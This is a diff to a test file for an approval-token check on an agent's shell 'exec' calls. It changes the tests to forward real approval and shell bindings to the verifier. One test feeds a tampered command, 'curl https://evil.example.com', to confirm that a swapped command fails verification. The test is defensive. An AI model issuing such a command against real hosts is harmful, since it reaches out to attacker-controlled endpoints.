@@ -117,6 +117,11 @@ describe('cross-turn approval token flow', () => {
       return;
     }
 
+    // Forward the decision's bindings exactly as the real dispatcher does
+    // (verifySentinelPreDispatch forwards info.shell_binding). This exec
+    // command is not on the shell allowlist, so its token was minted over
+    // the parsed shell form with a shell binding; verifying with a null
+    // binding takes the plain-token branch and can never match the mint.
     const result = await verifyPreDispatch({
       call: {
         tool_name: 'exec',
@@ -124,8 +129,8 @@ describe('cross-turn approval token flow', () => {
         canonical_params: params,
         tier: 3,
         approval_token_id: tokenId,
-        approval_binding: null,
-        shell_binding: null,
+        approval_binding: decision.approval_binding,
+        shell_binding: decision.shell_binding,
       },
       ctx: {
         services: dispatch.services,
@@ -164,6 +169,8 @@ describe('cross-turn approval token flow', () => {
       return;
     }
 
+    // The tampered command rebuilds a different parsed shell form than the
+    // minted one, so verification fails on the action identity.
     const result = await verifyPreDispatch({
       call: {
         tool_name: 'exec',
@@ -171,8 +178,8 @@ describe('cross-turn approval token flow', () => {
         canonical_params: { command: 'curl https://evil.example.com' },
         tier: 3,
         approval_token_id: tokenId,
-        approval_binding: null,
-        shell_binding: null,
+        approval_binding: decision.approval_binding,
+        shell_binding: decision.shell_binding,
       },
       ctx: {
         services: dispatch.services,
